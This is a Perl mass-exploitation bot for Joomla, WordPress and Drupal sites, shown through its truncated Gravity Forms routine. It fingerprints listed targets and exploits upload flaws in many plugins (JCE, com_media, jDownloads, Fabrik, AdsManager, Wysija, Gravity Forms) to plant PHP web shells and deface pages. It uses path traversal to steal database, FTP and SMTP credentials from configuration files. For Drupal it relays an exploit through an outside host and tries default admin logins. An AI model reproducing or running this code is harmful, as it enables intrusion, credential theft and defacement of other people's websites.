#!/usr/bin/perl
#Pegasus-bot-JOWP  © Coded By | Pegasus | Synchronize Hacker Team |
#[DRUPAL]
#[COM_ADS MANAGER] upload shell + index
#[COM_USER SCANNER]
#[COM_JCE] upload deface pic
#[COM_MEDIA] upload shell + index
#[COM_BLOG SCANNER]
#[COM_JDOWNLOADS] upload shell + index
#[COM_HDFLVPLAYER] download config
#[COM_FABRIC] upload shell + index
#wordpress
#[WYSIJA] upload shell + index
#[GRAVITY FORMS] upload shell + index
#[REVSLIDER ] upload shell + index
#[REVSLIDER GETCONFIG] Get config and try to login with password on panel admin
#[PMA SCANER]
#[REVSLIDER GET CPANEL]
#[REVSLIDER AJAX DEFACE]
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
my $datetime    = localtime;
$tmp="tmp";
    if (-e $tmp) 
    {
    }
    else
    {
        mkdir $tmp or die "Error creating directory: $tmp";
    }

$rez="Result";
    if (-e $rez) 
    {
    }
    else
    {
        mkdir $rez or die "Error creating directory: $rez";
    }

$logo="
 ____    _____    ____      _      ____    _   _   ____  
|  _  | | ____| | ___|     /  |   / ___|  | | | | | ___| 
| |_) | |  _|   | |  _    / _ |   |___ |  | | | | |___ | 
|  __/  | |___  | |_| |  / ___|    ___)|  | |_| |  ___) |
|_|     |_____| |____ | /_/   \_| |____/   |_____| |____| 
                                                         

";

print $logo;
print "\t";
print colored ("Pegasus-bot-JOWP |",'white on_black');
print colored (" JOOMLA, WORDPRESS, DRUPAL |",'white on_green');
print colored ("SYNCHRONIZE HACKER TEAM",'white on_red'),"\n";
print colored("[ Pegasus-bot-JOWP |Coded By Pegasus ]",'white on_blue'),"\n\n\n";
print colored ("Start At $datetime",'white on_red'),"\n\n";

open(tarrget,"<$ARGV[0]") or die "Website List \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
efrez();
}
sub efrez($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);

my $efreez = $ua->get("$site")->content;
if($efreez =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
    print colored("[WORDPRESS] $site",'white on_magenta'),"\n\n\n";
open(save, '>>tmp/wordpress.txt');
    print save "$site\n";
    close(save);
wysija();
gravity();
revshell();
}

elsif($efreez =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {
    print colored("[JOOMLA] $site",'white on_magenta'),"\n\n\n";
open(save, '>>tmp/joomla.txt');
    print save "$site\n";   
    close(save);
comadsmanegr();
comusers();
comjce();
comediashell();
comediaindex();
comblog();
comjdowloads();
hdflvplayer();
comfabr();
indecomfabr();
    }

elsif($efreez =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
    print colored("[DRUPAL] $site",'white on_magenta'),"\n\n\n";
    fuckdrupal();

open(save, '>>tmp/Drupal.txt'); 
    print save "$site\n";   
    close(save);
    }else{
    print "\n[UNKNOWN] $site\n";
}
}


####################################################################################################################
####################################################################################################################
######################################### DRUPAL  ##################################################################
####################################################################################################################
sub fuckdrupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://oriflame-angela.ru/Pegasus.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print colored ("[DRUPAL EXPLOIT]",'white on_red');
print " ............... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[WAIT I WILL MAKE SURE ABOUT USER AND PASSWORD]\n";
# // here to test the user name and the password if the website has been really fucked or not :p
$admin ="Pegasus";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';
print "$wp\n";

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print colored ("[BOOM] $site => User | $admin Password | $pass",'white on_yellow'),"\n";
    open(save, '>>Result/Drupal.txt');
    print save "Success Pegasus ! $site | username : Pegasus | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print "[NOT DRUPAL] .................. [ERROR]\n";
    }
}else{
# // here to test user: admin and password : admin on the panel admin 
print "[TRYING WITH USER AND PASSWORD ADMIN]\n"; 
$admin="admin";
$pass ="admin";
$dr = $site . '/user/login';
$brute = POST $dr, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in'];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){

print colored ("[BOOM] $site=> User | $admin Password | $pass",'white on_yellow'),"\n";

    open(save, '>>Result/Drupal.txt');
    
    print save "Success Pegasus ! $site | username : $admin | pass: $pass\n";
    
    close(save);
    }else{
print "[DRUPAL] ...................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

        }
    
}
}



####################################################################################################
####################################################################################################
######################################  JCE      ###################################################
####################################################################################################
####################################################################################################
   sub comjce($site){
print colored ("[COM JCE]",'white on_red');
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){
    open(save, '>>Result/vulntargets.txt');   
    print save "[JCE] $site\n";   
    close(save);

     print " .................. ";
     print color('bold white');
     print "[";
print color('reset');
print color('bold green');
print "VULN JCE";
print color('reset');
print color('bold white');
print "] ";
print color('reset');
print "\n[UPLOADING PICTURE]";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["Pegasus.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
print " ......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "PATCHED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/Pegasus.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
print " ......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "DEFACED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[LINK] => $def\n";
zoneh();
mirrorzon();
}
}else{print  " .................. ";
 print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}

    }
####################################################################################################
####################################################################################################
#################################  COM MEDIA  ######################################################
####################################################################################################
####################################################################################################
sub comediashell($site){
print "\n";
print colored ("[COM MEDIA]",'white on_red');
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
$shlez = "Pegasus.PhP.txt";
$shlz="$site/images/Pegasus.PhP.txt";
$index="$site/Pegasus.html";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
 print " .................... [VULN]\n[UPLOADING SHELL]";
     open(save, '>>Result/vulntargets.txt');   
    print save "[Media] $site\n";   
    close(save);
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/Pegasus/ || $check->is_success ) {
 print" ........... ";
  print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
        print colored ("[SHELL LINK] =>  $shlz",'white on_yellow'),"\n";
                open (TEXT, '>>Result/shells.txt');
                print TEXT "\n[ COM MEDIA SHELL] =>$shlz \n";
                close (TEXT);
my $checkndex = $ua->get("$index")->content;
if($checkndex=~/Hacked/){
        $def="$index";

        print colored ("[INDEX LINK] => $def",'white on_yellow'),"\n";
    zoneh();
    mirrorzon()
}

        }
    }else{print  " ................ ";
     print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}
        }           
########################################## INDEX ###################################################
sub comediaindex(){
$shlez = "Pegasus.txt";
$shlz="$site/images/Pegasus.txt";
#$index="$site/Pegasus.html";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
 print "\n[UPLOADING INDEX]";
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/Hacked/ || $check->is_success ) {
 print " ........... ";
 print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "DEFACED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

        print colored ("[INDEX LINK] =>  $shlz",'white on_yellow'),"\n";
        $def="$shlz";
    zoneh();
mirrorzon()
        }

        }
    }
####################################################################################################
####################################################################################################
#########################################jdownloads  ###############################################
####################################################################################################
####################################################################################################

    sub comjdowloads($site){
print colored ("[COM JDOWNLOADS]",'white on_red');
$file="Pega.rar";
$filez="Pegasus.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/Pegasus.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Pegasus", mail=>"pegasus0hacker@gmail.com", filetitle =>"Pegasus", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print " ............... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[jdown] $site\n";   
    close(save);

print "[SCANING SHELL] ................ ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Pegasus/) {
print colored ("[SHELL LINK] => $shellpath",'white on_green'),"\n";
        open (TEXT, '>>Result/shells.txt');
        print TEXT "[ JDWN SHELL] => $shellpath\n";
        close (TEXT);
}else{
##################################################################
print "[ERROR] ................... ";
            print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "SHELL 404";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}

# // if shell not uploaded this will upload a gif index //

print "[JDOWNLOAD INDEX]";

$def = $site . '/images/jdownloads/screenshots/Pegasus.html.j';
$filee="Pegasus.rar";
$filezz="Pegasus.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Fallag Pegasus", mail=>"Pegasus@gmail.com", filetitle =>"Pegasus", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print " ................ ";
            print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SCANING INDEX] ................";
            print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print "[DEFACE] .....................";
            print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print colored ("[INDEX LINK] => $def",'white on_green'),"\n";
zoneh();
mirrorzon();
}else{
print "[DEFACE] .......................";
            print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

        }
}
}else{ print  " ........... ";
            print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}

    }


####################################################################################################
####################################################################################################
######################################COM hdflvplayer##############################################
####################################################################################################
####################################################################################################
   sub hdflvplayer($site){

# // here for download config but i have to add download cpanel information :p  //

        print colored ("[HDFLVPLAYER]",'white on_red');
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){
    print " .................. ",
                print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[hdflv] $site\n";   
    close(save);




        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
        print color("white"),"\t[+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("red"),"\t[-]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("red"),"\t[-]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("red"),"\t[-]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("red"),"\t[-]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("red"),"\t[-]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("red"),"\t[-]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("red"),"\t[-]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("red"),"\t[-]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[-]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP Host = $1 \n\n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}

}else{print  " .............. ";
            print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

    }

}

####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################

sub comfabr(){
        print colored ("[COM FABRIC]",'white on_red');
$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/Pegasus.txt';
$fabshell = $site . '/media/Pegasus.PhP.txt';
##
$indfile="Pegasus.txt";
$shelfile="Pegasus.PhP.txt";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/Pegasus/) {
print " ................... ";

print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[fabric] $site\n";   
    close(save);

print "[SHELL LINK] => $fabshell\n";
        open (TEXT, '>>Result/shells.txt');
        print TEXT "[COM FABRIC] =>$fabshell \n";
        close (TEXT);
}else{
            print " ............... ";
            print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

    }
}
############################################# INDEX ################################################

sub indecomfabr(){
    print "[UPLOAD INDEX COM FABRIC] .......";
 print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$def")->content;
if($checkfab =~/Hacked/) {
        open(save, '>>Result/vulntargets.txt');   
    print save "[fabric] $site\n";   
    close(save);

    print "[DEFACE] .................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

    print "[INDEX LINK] => $def\n";
zoneh();
mirrorzon();
            }else{
print  "[DEFACE] ...................... ";
        print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

                        }
}

####################################################################################################
####################################################################################################
#######################################   COM USERS    #############################################
####################################################################################################
####################################################################################################

sub comusers(){
    print colored ("[COM USER SCANNER]",'white on_red');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

my $exploit = "$site/index.php?option=com_users&view=registration";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/jform_email2-lbl/) {
    print" ............. ";
            print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[users] $site\n";   
    close(save);

    }else{
        print" ......... ";
        print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    }
}

####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
    print colored ("[COM ADS MANAGER]",'white on_red');
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], name => "xPegasusx.html"]);
if ($exploit->decoded_content =~ /xPegasusx.html/) {
    print " .............. [VULN]\n";
        open(save, '>>Result/vulntargets.txt');   
    print save "[ads] $site\n";   
    close(save);

    print "[UPLOAD INDEX] ................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

    $def="$site/tmp/plupload/xGassx.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Hacked|Defaced|Pegasus/) {
    print "[DEFACE] .................... ";
    print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[INDEX LINK] => $def\n";
    zoneh();
    mirrorzon();
    adshell();
    }
}else{print " .......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}
}




sub adshell(){

        print "[UPLOAD SHELL] ................... ";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
my $exploitxx = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["loader.jpg"], name => "xPegasusx.php"]);
if ($exploitxx->decoded_content =~ /xPegasusx.php/) {
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SCANING SHELL] ................ ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

my $check = $ua->get("$site/tmp/plupload/xPegasusx.php")->content;
my $checkk = $ua->get("$site/xPegasusx.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
print "[SHELL] ......................";
            print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SHELL LINK] => $site/xPegasusx.php\n";
    open(save, '>>Result/shells.txt');
    print save "[ADS] $site/xPegasusx.php\n";
    close(save);
    my $checkjo = $ua->get("$site/un.php")->content;
if($checkjo =~ /path:(.*)<b><br>uname:(.*)<br><\/b>Pegasus/){
    print "\n";
print colored ("[PATH] : $1",'black on_yellow'),"\n\n";
print colored ("[KERNEL]:$2",'black on_yellow'),"\n";
print "\n";
    open(save, '>>Result/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
}else{
  print "[SHELL] ........................";
            print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');  
}

}
}
####################################################################################################
####################################################################################################
############################# COM BLOG SCANNER    ##################################################
####################################################################################################
####################################################################################################
sub comblog(){
    print colored ("[COM BLOG SCANNER]",'white on_red');


$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (10);

my $exploitblog = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~/has been uploaded/) {
    print" ............. ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[blog] $site\n";   
    close(save);

print "[ $site EXPLOIT IT MANUEL ]\n";
    }
    else {print " ......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}
}

####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
######################################      WORDPRESS          #####################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
############################################wysija #################################################
####################################################################################################
sub wysija(){
print colored("[WYSIJA]",'white on_red');

$zokometheme = "my-theme";
my $path = "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $exploit = $ua->post("$site/$path", Content_Type => 'form-data', Content => [ $zokometheme => ['Pegasus.zip', => 'Pegasus.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);

my $check = $ua->get("$site/wp-content/uploads/wysija/themes/Pegasus/herewgo.php")->content;
my $checkk = $ua->get("$site/xPegasusx.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
        open(save, '>>Result/vulntargets.txt');   
    print save "[wysija] $site\n";   
    close(save);
print" ........................ ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[UPLOADING SHELL] ...........";

print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
print "[SHELL LINK] => $site/xPegasusx.php\n";
    open(save, '>>Result/shells.txt');  
    print save "[WYSIJA] $site/xPegasusx.php\n"; 
    close(save);
my $checkgasss = $ua->get("$site/un.php")->content;
if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b>Pegasus/){
    print "\n";
print colored ("[PATH] : $1",'black on_yellow'),"\n\n";
print colored ("[KERNEL]:$2",'black on_yellow'),"\n";
print "\n";
    open(save, '>>Result/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
$def="$site/Pegasus.html";
my $fuckingcheck = $ua->get("$def")->content;
    if($fuckingcheck =~m/Fallag|Hacked/i) {
                    zoneh();
                    mirrorzon();
}




}else {
    print" ...................... ";

print color('bold white');
print "[";
print color('reset');
print color('bold RED');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}
}
####################################################################################################
####################################################################################################
########################################   GRAVITY FORMS   #########################################
####################################################################################################
####################################################################################################

sub gravity(){
print colored ("[GRAVITY FORMS]",'white on_red');
my $path = "/?gf_page=upload";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploitgrav = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Pegasus.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "Pegasus.php5"]);
if ($exploitgrav->decoded_content =~ /_input_3_Pegasus.php5/) {
    print " ................ ";
    print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
